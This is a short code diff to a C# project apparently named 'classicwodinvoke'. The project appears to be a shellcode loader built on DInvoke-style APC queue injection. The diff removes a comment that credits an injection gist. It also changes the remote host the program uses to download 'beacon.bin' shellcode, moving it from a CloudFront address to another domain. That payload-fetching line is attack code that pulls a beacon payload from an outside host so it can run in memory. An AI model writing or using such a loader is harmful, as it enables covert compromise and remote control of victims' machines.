@@ -13,7 +13,6 @@ using System.Security.Cryptography;
 using static classicwodinvoke.DELEGATES;
 
 
-//reference https://gist.githubusercontent.com/jfmaes/944991c40fb34625cf72fd33df1682c0/raw/68bbba6534499c4683ce868272398b3b9571be97/DInjectQueuerAPC.cs
 
 namespace classicwodinvoke
 {
@@ -37,7 +36,7 @@ namespace classicwodinvoke
                 using (var client = new HttpClient(handler))
                 {
                     // Download the shellcode
-                    shellcode = await client.GetByteArrayAsync("https://d8l4xxrfk9hyp.cloudfront.net/beacon.bin");
+                    shellcode = await client.GetByteArrayAsync("https://gethatbin.net/beacon.bin");
                 }
             }
 
